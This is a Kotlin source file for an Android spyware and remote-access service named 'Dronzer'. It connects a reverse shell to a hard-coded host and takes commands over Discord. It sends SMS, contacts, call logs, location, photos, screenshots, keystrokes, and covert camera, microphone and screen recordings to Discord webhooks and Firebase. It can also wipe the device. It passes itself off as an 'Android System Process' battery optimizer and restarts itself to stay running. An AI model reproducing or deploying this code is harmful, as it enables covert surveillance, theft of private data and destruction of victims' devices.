package com.example.dronzer

import android.Manifest
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.hardware.camera2.CameraManager
import android.net.wifi.WifiManager
import android.os.*
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityManager
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.InetSocketAddress
import java.net.Socket
import java.util.concurrent.TimeUnit
import java.io.File

class DronzerService : Service() {
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var engineJob: Job? = null
    private var heartbeatJob: Job? = null
    private var socket: Socket? = null
    private var writer: OutputStreamWriter? = null
    private var reader: BufferedReader? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiLock: WifiManager.WifiLock? = null
    
    private var cameraStreamer: LiveCameraStreamer? = null
    private var ultraCamMode: UltraCamMode? = null
    private var audioStreamer: LiveAudioStreamer? = null
    
    private var cameraRecorder: CameraRecorder? = null
    private var screenRecorder: ScreenRecorder? = null
    private var audioRecorder: AudioRecorder? = null
    
    private var statusJob1: Job? = null
    private var statusJob2: Job? = null
    private var statusJob4: Job? = null
    
    private var isCamFront = true

    private val socketMutex = Mutex()

    companion object {
        const val NOTIFICATION_ID = 101
        const val CHANNEL_ID = "dronzer_system_persistence"
        const val ACTION_RELOAD_CONFIG = "com.example.dronzer.ACTION_RELOAD_CONFIG"
    }

    override fun onCreate() {
        super.onCreate()
        Log.d("DronzerService", "Service Created")
        
        DeviceManager.initialize(applicationContext)

        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Dronzer::BackgroundLock")
        if (wakeLock?.isHeld == false) {
            wakeLock?.acquire()
        }

        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        wifiLock = wifiManager.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "Dronzer::WifiLock")
        if (wifiLock?.isHeld == false) {
            wifiLock?.acquire()
        }

        startInForeground()
        LocationSender.startLocationUpdates(applicationContext)
        SensorDataCollector.start(applicationContext)

        DiscordManager.startListening(applicationContext) { command ->
            handleCommand(command, true)
        }
        
        DiscordManager.sendStartNotification(Build.MODEL)
        FirebaseManager.uploadReport("Status", "Service Started on ${Build.MODEL}")

        setupPersistence()
        recoverLostRecordings()
    }

    private fun startInForeground() {
        createNotificationChannel(CHANNEL_ID)

        val mainIntent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(this, 0, mainIntent, PendingIntent.FLAG_IMMUTABLE)

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Android System Process")
            .setContentText("Optimizing battery usage...")
            .setSmallIcon(R.drawable.ic_logo)
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setCategory(Notification.CATEGORY_SERVICE)
            .setOngoing(true)
            .setAutoCancel(false)
            .setOnlyAlertOnce(true)
            .setContentIntent(pendingIntent)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                var types = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or 
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or 
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or 
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                }
                startForeground(NOTIFICATION_ID, notification, types)
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            Log.e("DronzerService", "Foreground error: ${e.message}")
            try { startForeground(NOTIFICATION_ID, notification) } catch (e2: Exception) {}
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("DronzerService", "onStartCommand: action=${intent?.action}")
        startInForeground()

        if (intent?.action == ACTION_RELOAD_CONFIG) {
            Log.d("DronzerService", "Reloading Discord configuration...")
            DiscordManager.startListening(applicationContext) { command ->
                handleCommand(command, true)
            }
        }

        if (engineJob?.isActive != true) {
            engineJob = startCLIEngine()
        }
        
        schedulePersistentAlarm()
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        Log.d("DronzerService", "Task removed, triggering persistence protocols...")
        
        // Immediate restart via AlarmManager
        val restartIntent = Intent(this, RestartReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(this, 1, restartIntent, PendingIntent.FLAG_IMMUTABLE)
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 1000, pendingIntent)
        
        // Backup restart via WorkManager
        val workRequest = OneTimeWorkRequestBuilder<DronzerWorker>()
            .setInitialDelay(5, TimeUnit.SECONDS)
            .build()
        WorkManager.getInstance(this).enqueue(workRequest)
        
        super.onTaskRemoved(rootIntent)
    }

    private fun setupPersistence() {
        scheduleWorker()
        schedulePersistentAlarm()
        Log.d("DronzerService", "Persistence protocols (WorkManager & AlarmManager) initialized.")
    }

    private fun startCLIEngine(): Job {
        return serviceScope.launch {
            while (isActive) {
                try {
                    val host = "192.168.1.9"
                    val port = 8888
                    socket = Socket()
                    socket?.connect(InetSocketAddress(host, port), 20000)
                    
                    writer = OutputStreamWriter(socket!!.getOutputStream())
                    reader = BufferedReader(InputStreamReader(socket!!.getInputStream()))

                    writer?.write("\n\u001b[1;32m[+] DRONZER SHELL ESTABLISHED\u001b[0m\n")
                    writer?.write("Device: ${Build.MODEL}\nType 'help' for commands.\n\n")
                    writer?.flush()

                    startHeartbeat()

                    while (isActive) {
                        writer?.write("\u001b[1;36mDronzer\u001b[0m@\u001b[1;32m${Build.MODEL}\u001b[0m:~$ ")
                        writer?.flush()
                        
                        val input = withContext(Dispatchers.IO) { 
                            try { reader?.readLine() } catch (e: Exception) { null }
                        } ?: break
                        
                        val cleanInput = input.trim().replace("\u0000", "")
                        if (cleanInput.isEmpty()) continue
                        
                        handleCommand(cleanInput, false)
                    }
                } catch (e: Exception) {
                    Log.e("DronzerService", "Connection lost: ${e.message}")
                    delay(5000)
                } finally {
                    closeSocket()
                }
            }
        }
    }

    private fun startHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = serviceScope.launch {
            while (isActive) {
                delay(45000)
                try {
                    socketMutex.withLock {
                        if (socket?.isConnected == true && writer != null) {
                            writer?.write("\u0000")
                            writer?.flush()
                        }
                    }
                } catch (e: Exception) {
                    Log.e("DronzerService", "Heartbeat failed")
                    break 
                }
            }
        }
    }

    private fun recoverLostRecordings() {
        serviceScope.launch {
            try {
                val cacheDir = applicationContext.cacheDir
                val files = cacheDir.listFiles { file ->
                    file.name.startsWith("rec_") && file.length() > 0
                }
                
                if (files != null && files.isNotEmpty()) {
                    Log.d("DronzerService", "Found ${files.size} lost recordings. Recovering...")
                    val recoveryMsg = "⚠️ **System Recovery**: Found ${files.size} unfinished recording(s). Uploading..."
                    DiscordManager.sendToWebhook(recoveryMsg)
                    FirebaseManager.uploadReport("Recovery", recoveryMsg)
                    
                    for (file in files) {
                        val type = when {
                            file.name.contains("audio") -> "Audio"
                            file.name.contains("cam") -> "Camera"
                            file.name.contains("screen") -> "Screen"
                            file.name.contains("keytaps") -> "KeyTaps"
                            else -> "Unknown"
                        }
                        uploadWithProgress(file, ">> Recovered $type recording uploaded successfully.", type.lowercase())
                        delay(2000)
                    }
                }
            } catch (e: Exception) {
                Log.e("DronzerService", "Recovery failed: ${e.message}")
            }
        }
    }

    private fun handleCommand(command: String, fromDiscord: Boolean) {
        if (command.isEmpty()) return
        Log.d("DronzerService", "Command received: $command (fromDiscord: $fromDiscord)")

        val parts = command.split(" ", limit = 2)
        val cmd = parts[0].lowercase().trim()
        val arg = if (parts.size > 1) parts[1] else ""

        try {
            var response: String? = null
            var fileName: String? = null
            var fbType: String? = null

            if (fromDiscord) {
                when (cmd) {
                    "devices" -> {
                        DiscordManager.sendToWebhook(DeviceManager.getDeviceInfo())
                        return
                    }
                    "select" -> {
                        if (arg == DeviceManager.deviceId) {
                            DeviceManager.setTargeted(applicationContext, true)
                            DiscordManager.sendToWebhook("✅ Device Selected: `${Build.MODEL}`")
                        } else {
                            DeviceManager.setTargeted(applicationContext, false)
                        }
                        return
                    }
                    "switch" -> {
                        if (arg == DeviceManager.deviceId) {
                            DeviceManager.setTargeted(applicationContext, true)
                            DiscordManager.sendToWebhook("🔄 Switched Target to: `${Build.MODEL}`")
                        } else {
                            DeviceManager.setTargeted(applicationContext, false)
                        }
                        return
                    }
                    "all" -> {
                        DeviceManager.setTargeted(applicationContext, true)
                        DiscordManager.sendToWebhook("✅ Device Activated: `${Build.MODEL}`")
                        return
                    }
                    "yes", "no", "confirm_reset", "cancel_reset" -> {}
                    
                    else -> {
                        if (!DeviceManager.isTargeted(applicationContext)) {
                            Log.d("DronzerService", "Command ignored: Device `${Build.MODEL}` not targeted.")
                            return
                        }
                    }
                }
            }

            when (cmd) {
                "yes" -> {
                    if (fromDiscord) {
                        DeviceManager.setTargeted(applicationContext, true)
                        response = ">> Signaling host via Discord to open GUI..."
                        DiscordManager.sendToWebhook("[SIGNAL] OPEN_GUI", raw = true)
                    }
                }
                "no" -> {
                    if (fromDiscord) response = ">> GUI opening cancelled."
                }
                "reset" -> {
                    if (fromDiscord) {
                        if (FactoryReset.isAdminActive(applicationContext)) {
                            DiscordManager.sendResetConfirmation(Build.MODEL)
                            response = ">> Sending Factory Reset confirmation to Discord..."
                        } else {
                            response = "[!] Device Admin NOT active. Factory Reset unavailable. Please enable 'Dronzer System Admin' in Settings."
                        }
                    } else {
                        response = "[!] Factory Reset command is only available via Discord for safety."
                    }
                }
                "confirm_reset" -> {
                    if (fromDiscord) {
                        response = ">> ⚠️ RECEIVED CONFIRMATION. INITIATING FACTORY RESET..."
                        DiscordManager.sendToWebhook(response)
                        FirebaseManager.uploadReport("System", "Initiating Factory Reset")
                        FactoryReset.wipeData(applicationContext)
                    }
                }
                "cancel_reset" -> {
                    if (fromDiscord) response = ">> Factory Reset cancelled."
                }
                "help" -> response = "\nAvailable: devices, select <id>, switch <id>, all, location, calllogs, contacts, sms, notifs, gallery, getimg <path>, vibrate, info, ss, scam, ssc, monster, audio, sensors, keys, scrscr, reset, stop1, stop2, stop3, stop4, stop5, stop6, clc, exit\n"
                "location" -> {
                    response = LocationSender.getLocationString(applicationContext)
                    fileName = "location.txt"
                    fbType = "Location"
                }
                "calllogs" -> {
                    response = CallLogSender.getCallLogString(applicationContext)
                    fileName = "calllogs.txt"
                    fbType = "CallLogs"
                }
                "contacts" -> {
                    response = ContactsSender.getContactsString(applicationContext)
                    fileName = "contacts.txt"
                    fbType = "Contacts"
                }
                "sms" -> {
                    val file = SmsSender.getSmsFile(applicationContext)
                    if (file != null && file.exists()) {
                        response = "[+] SMS logs generated. Starting upload..."
                        DiscordManager.sendFileToWebhook(file, ">> SMS Logs Uploaded") { success, _ -> if (success) file.delete() }
                        FirebaseManager.uploadFile(file, "sms") { _ -> }
                    } else {
                        response = "[!] Failed to generate SMS logs or no SMS found."
                    }
                }
                "notifs" -> {
                    response = NotificationMonitor.getNotifications()
                    fileName = "notifications.txt"
                    fbType = "Notifications"
                }
                "gallery" -> {
                    response = MediaScanner.getMediaList(applicationContext)
                    fileName = "gallery.txt"
                    fbType = "Gallery"
                }
                "getimg" -> {
                    if (arg.isNotEmpty()) {
                        val bytes = MediaScanner.getImageBytes(applicationContext, arg)
                        if (bytes != null) {
                            val discordFileName = arg.substringAfterLast('/')
                            if (fromDiscord) {
                                DiscordManager.sendBytesToWebhook(bytes, discordFileName)
                                response = "[+] Sending image file: `$discordFileName` to Discord..."
                            } else {
                                sendImageRaw(bytes, "gallery_item")
                                response = "[+] Sending image to TCP terminal..."
                            }
                            FirebaseManager.uploadBytes(bytes, discordFileName, "gallery_exfil")
                        } else {
                            response = "[!] File not found: $arg"
                        }
                    } else {
                        response = "Usage: getimg <path>"
                    }
                }
                "vibrate" -> {
                    val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        vibrator.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE))
                    } else {
                        @Suppress("DEPRECATION")
                        vibrator.vibrate(1000)
                    }
                    response = ">> Vibrating..."
                }
                "info" -> {
                    response = DeviceInfoSender.getDeviceInfoString(applicationContext)
                    fileName = "device_info.txt"
                    fbType = "DeviceInfo"
                }
                "ss" -> {
                    response = ">> Capturing Screenshot..."
                    ScreenshotCapturer.captureScreen(applicationContext) { bytes ->
                        val fileNameSS = "screenshot_${System.currentTimeMillis()}.jpg"
                        if (fromDiscord) {
                            DiscordManager.sendBytesToWebhook(bytes, fileNameSS)
                        } else {
                            sendImageRaw(bytes, "screenshot")
                        }
                        FirebaseManager.uploadBytes(bytes, fileNameSS, "screenshots")
                    }
                }
                "scam" -> {
                    startCameraRecording(fromDiscord)
                }
                "ssc" -> {
                    startScreenRecording(fromDiscord)
                }
                "audio" -> {
                    startAudioRecording(fromDiscord)
                }
                "keys" -> {
                    if (isAccessibilityServiceEnabled(applicationContext, DronzerAccessibilityService::class.java)) {
                        val intent = Intent(applicationContext, DronzerAccessibilityService::class.java)
                        intent.action = "START_RECORDING"
                        startService(intent)
                        response = "[+] Key recording started..."
                    } else {
                        response = "[!] Accessibility permission NOT granted. Please enable it in Settings."
                    }
                }
                "scrscr" -> {
                    if (isAccessibilityServiceEnabled(applicationContext, DronzerAccessibilityService::class.java)) {
                        val intent = Intent(applicationContext, DronzerAccessibilityService::class.java)
                        intent.action = "START_SCRSCR"
                        startService(intent)
                        response = "[+] Screen scraping started..."
                    } else {
                        response = "[!] Accessibility permission NOT granted. Please enable it in Settings."
                    }
                }
                "stop1" -> {
                    statusJob1?.cancel()
                    val file = cameraRecorder?.stopRecording()
                    if (file != null && file.exists()) {
                        response = "[+] Camera recording stopped. Starting upload..."
                        uploadWithProgress(file, ">> Camera recording finished.", "camera")
                    } else {
                        response = "[!] Camera recording file not found."
                    }
                }
                "stop2" -> {
                    statusJob2?.cancel()
                    val file = screenRecorder?.stopRecording()
                    if (file != null && file.exists()) {
                        response = "[+] Screen recording stopped. Starting upload..."
                        uploadWithProgress(file, ">> Screen recording finished.", "screen")
                    } else {
                        response = "[!] Screen recording file not found."
                    }
                }
                "stop4" -> {
                    statusJob4?.cancel()
                    val file = audioRecorder?.stopRecording()
                    if (file != null && file.exists()) {
                        response = "[+] Audio recording stopped. Starting upload..."
                        uploadWithProgress(file, ">> Audio recording finished.", "audio")
                    } else {
                        response = "[!] Audio recording file not found."
                    }
                }
                "stop5" -> {
                    val intent = Intent(this, DronzerAccessibilityService::class.java)
                    intent.action = "STOP_RECORDING"
                    startService(intent)
                    response = "[+] Key recording stopped. Log will be uploaded shortly."
                }
                "stop6" -> {
                    val intent = Intent(this, DronzerAccessibilityService::class.java)
                    intent.action = "STOP_SCRSCR"
                    startService(intent)
                    response = "[+] Screen scraping stopped."
                }
                "monster" -> {
                    stopAllStreams()
                    response = ">> Starting MONSTER MODE (All Cameras)..."
                    if (ultraCamMode == null) {
                        ultraCamMode = UltraCamMode(applicationContext) { id, bytes ->
                            if (fromDiscord) DiscordManager.sendBytesToWebhook(bytes, "monster_$id.jpg", true) else sendImageRaw(bytes, "live_monster_$id")
                            FirebaseManager.uploadBytes(bytes, "monster_${id}_${System.currentTimeMillis()}.jpg", "monster_mode")
                        }
                    }
                    ultraCamMode?.startMonsterMode()
                }
                "stop3" -> {
                    ultraCamMode?.stopMonsterMode()
                    response = ">> Monster mode stopped."
                }
                "sensors" -> {
                    response = SensorDataCollector.getSensorDetails()
                    fileName = "sensors.txt"
                    fbType = "Sensors"
                }
                "clc" -> {
                    val cacheDir = applicationContext.cacheDir
                    val files = cacheDir.listFiles { file -> file.name.startsWith("rec_") }
                    val count = files?.size ?: 0
                    files?.forEach { it.delete() }
                    response = "[+] Caches cleared. Removed $count unfinished recording(s)."
                    if (!fromDiscord) {
                        response = "\u001b[2J\u001b[H" + response
                    }
                }
                "exit" -> closeSocket()
                else -> response = ">> Unknown command: $cmd"
            }

            if (response != null) {
                if (fromDiscord) {
                    val cleanResponse = response.replace(Regex("\u001b\\[[;\\d]*m"), "")
                    DiscordManager.sendToWebhook(cleanResponse, fileName)
                    if (fbType != null) {
                        FirebaseManager.uploadReport(fbType, cleanResponse)
                    }
                } else {
                    writer?.write(response)
                    writer?.flush()
                }
            }
        } catch (e: Exception) {
            Log.e("DronzerService", "Command execution failed: ${e.message}")
        }
    }

    private fun isAccessibilityServiceEnabled(context: Context, service: Class<*>): Boolean {
        val am = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices = Settings.Secure.getString(context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
        val componentName = ComponentName(context, service)
        return enabledServices?.contains(componentName.flattenToString()) ?: false
    }

    private fun startCameraRecording(fromDiscord: Boolean) {
        statusJob1?.cancel()
        statusJob1 = serviceScope.launch {
            while (isActive) {
                if (ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                    val msg = "[!] CAMERA permission not granted. Cannot record."
                    if (fromDiscord) DiscordManager.sendToWebhook(msg) else { writer?.write(msg + "\n"); writer?.flush() }
                    break
                }
                if (isCameraInUse()) {
                    val msg = "⚠️ Camera is currently in use by another app. Retrying in 30s..."
                    if (fromDiscord) DiscordManager.sendToWebhook(msg) else { writer?.write(msg + "\n"); writer?.flush() }
                    delay(30000)
                    continue
                }
                isCamFront = true
                if (cameraRecorder == null) {
                    cameraRecorder = CameraRecorder(applicationContext, 
                        onMaxLimitReached = { file ->
                            uploadWithProgress(file, ">> Camera recording reached max size. Uploading part...", "camera")
                            startCameraRecording(fromDiscord)
                        },
                        onInterrupted = { file ->
                            uploadWithProgress(file, "⚠️ Camera recording interrupted. Uploading partial file...", "camera")
                            startCameraRecording(fromDiscord) 
                        }
                    )
                }
                startInForeground()
                val file = cameraRecorder?.startRecording(isCamFront)
                if (file != null) {
                    val msg = "[+] Front Camera recording started..."
                    if (fromDiscord) DiscordManager.sendToWebhook(msg) else { writer?.write(msg + "\n"); writer?.flush() }
                    break
                } else {
                    val msg = "[!] Failed to start camera recording. Retrying in 30s..."
                    if (fromDiscord) DiscordManager.sendToWebhook(msg) else { writer?.write(msg + "\n"); writer?.flush() }
                    delay(30000)
                }
            }
        }
    }

    private fun startScreenRecording(fromDiscord: Boolean) {
        statusJob2?.cancel()
        statusJob2 = serviceScope.launch {
            while (isActive) {
                startInForeground()
                val projection = LiveScreenStreamer.getProjection(applicationContext)
                if (projection == null) {
                    val msg = "[!] SCREEN CAST permission not granted or expired. Run '!ss' once first to request it."
                    if (fromDiscord) DiscordManager.sendToWebhook(msg) else { writer?.write(msg + "\n"); writer?.flush() }
                    break
                }
                if (screenRecorder == null) {
                    screenRecorder = ScreenRecorder(applicationContext, 
                        onMaxLimitReached = { file ->
                            uploadWithProgress(file, ">> Screen recording reached max size. Uploading part...", "screen")
                            startScreenRecording(fromDiscord)
                        },
                        onInterrupted = { file ->
                            uploadWithProgress(file, "⚠️ Screen recording interrupted. Uploading partial file...", "screen")
                            startScreenRecording(fromDiscord)
                        }
                    )
                }
                try {
                    screenRecorder?.startRecording(projection)
                    val msg = "[+] Screen recording started..."
                    if (fromDiscord) DiscordManager.sendToWebhook(msg) else { writer?.write(msg + "\n"); writer?.flush() }
                    break
                } catch (e: Exception) {
                    val msg = "⚠️ Screen capture likely in use or failed. Retrying in 30s..."
                    if (fromDiscord) DiscordManager.sendToWebhook(msg) else { writer?.write(msg + "\n"); writer?.flush() }
                    delay(30000)
                    continue
                }
            }
        }
    }

    private fun startAudioRecording(fromDiscord: Boolean) {
        statusJob4?.cancel()
        statusJob4 = serviceScope.launch {
            while (isActive) {
                if (ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                    val msg = "[!] MICROPHONE permission not granted. Cannot record."
                    if (fromDiscord) DiscordManager.sendToWebhook(msg) else { writer?.write(msg + "\n"); writer?.flush() }
                    break
                }
                if (isMicrophoneInUse()) {
                    val msg = "⚠️ Microphone is currently in use by another app. Retrying in 30s..."
                    if (fromDiscord) DiscordManager.sendToWebhook(msg) else { writer?.write(msg + "\n"); writer?.flush() }
                    delay(30000)
                    continue
                }
                if (audioRecorder == null) {
                    audioRecorder = AudioRecorder(applicationContext, 
                        onMaxLimitReached = { file ->
                            uploadWithProgress(file, ">> Audio recording reached max size. Uploading part...", "audio")
                            startAudioRecording(fromDiscord)
                        },
                        onInterrupted = { file ->
                            uploadWithProgress(file, "⚠️ Audio recording interrupted. Uploading partial file...", "audio")
                            startAudioRecording(fromDiscord)
                        }
                    )
                }
                startInForeground()
                val file = audioRecorder?.startRecording()
                if (file != null) {
                    val msg = "[+] Audio recording started..."
                    if (fromDiscord) DiscordManager.sendToWebhook(msg) else { writer?.write(msg + "\n"); writer?.flush() }
                    break
                } else {
                    val msg = "[!] Failed to start audio recording. Mic might be busy. Retrying in 30s..."
                    if (fromDiscord) DiscordManager.sendToWebhook(msg) else { writer?.write(msg + "\n"); writer?.flush() }
                    delay(30000)
                    continue
                }
            }
        }
    }

    private fun isCameraInUse(): Boolean {
        return false 
    }

    private fun isMicrophoneInUse(): Boolean {
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
        return audioManager.mode != android.media.AudioManager.MODE_NORMAL
    }

    private fun uploadWithProgress(file: File, completionMessage: String, fbFolder: String) {
        DiscordManager.sendFileToWebhook(file, completionMessage, null, { success, error ->
            Log.d("DronzerService", "Discord upload result: $success")
        })
        
        FirebaseManager.uploadFile(file, fbFolder) { success ->
            if (success) {
                Log.d("DronzerService", "Firebase upload success. Deleting file.")
                file.delete()
            } else {
                Log.e("DronzerService", "Firebase upload failed. File kept for recovery.")
            }
        }
    }

    private fun stopAllStreams() {
        cameraStreamer?.stopStreaming()
        LiveScreenStreamer.stopStreaming()
        ultraCamMode?.stopMonsterMode()
        audioStreamer?.stopStreaming()
    }

    private fun sendImageRaw(bytes: ByteArray, type: String) {
        serviceScope.launch {
            socketMutex.withLock {
                try {
                    withContext(Dispatchers.IO) {
                        val out = socket?.getOutputStream()
                        if (out != null && writer != null) {
                            writer?.write("IMAGE_START:$type:${bytes.size}\n")
                            writer?.flush()
                            out.write(bytes)
                            out.flush()
                        }
                    }
                } catch (e: Exception) {}
            }
        }
    }

    private fun sendAudioRaw(bytes: ByteArray) {
        serviceScope.launch {
            socketMutex.withLock {
                try {
                    withContext(Dispatchers.IO) {
                        val out = socket?.getOutputStream()
                        if (out != null && writer != null) {
                            writer?.write("AUDIO_START:${bytes.size}\n")
                            writer?.flush()
                            out.write(bytes)
                            out.flush()
                        }
                    }
                } catch (e: Exception) {}
            }
        }
    }

    private fun createNotificationChannel(id: String) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(id, "System Performance", NotificationManager.IMPORTANCE_LOW)
            channel.description = "Required for system-level background optimizations."
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun schedulePersistentAlarm() {
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, RestartReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)
        val interval = 5 * 60 * 1000L
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            if (alarmManager.canScheduleExactAlarms()) {
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + interval, pendingIntent)
            } else {
                alarmManager.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + interval, pendingIntent)
            }
        } else {
            alarmManager.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + interval, pendingIntent)
        }
    }

    private fun scheduleWorker() {
        val workRequest = PeriodicWorkRequestBuilder<DronzerWorker>(15, TimeUnit.MINUTES).build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork("DronzerWorker", ExistingPeriodicWorkPolicy.KEEP, workRequest)
    }

    private fun closeSocket() {
        serviceScope.launch {
            socketMutex.withLock {
                try {
                    heartbeatJob?.cancel()
                    writer?.close()
                    reader?.close()
                    socket?.close()
                } catch (e: Exception) {}
                writer = null
                reader = null
                socket = null
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        stopAllStreams()
        cameraRecorder?.stopRecording()
        screenRecorder?.stopRecording()
        audioRecorder?.stopRecording()
        statusJob1?.cancel()
        statusJob2?.cancel()
        statusJob4?.cancel()
        closeSocket()
        wakeLock?.let { if (it.isHeld) it.release() }
        wifiLock?.let { if (it.isHeld) it.release() }
        val intent = Intent(this, RestartReceiver::class.java)
        sendBroadcast(intent)

        // WorkManager persistence backup
        val workRequest = OneTimeWorkRequestBuilder<DronzerWorker>()
            .setInitialDelay(10, TimeUnit.SECONDS)
            .build()
        WorkManager.getInstance(this).enqueue(workRequest)
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
